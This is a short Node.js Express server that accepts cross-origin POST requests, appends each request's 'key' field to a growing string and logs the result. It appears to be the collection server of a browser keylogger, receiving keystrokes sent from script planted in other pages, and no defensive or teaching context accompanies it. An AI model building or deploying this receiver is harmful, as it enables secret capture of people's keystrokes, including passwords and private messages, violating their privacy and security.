const express = require("express");
const cors = require("cors");

const app = express(); // creates an express application
app.use(express.json()); // this will make the app parse json body sent in the POST request
app.use(cors());

var keys = "";

app.post("/", (req, res) => {
  keys += req.body.key;
  console.log(keys);
});

app.listen(5555, () => console.log("Listening on port 5555"));
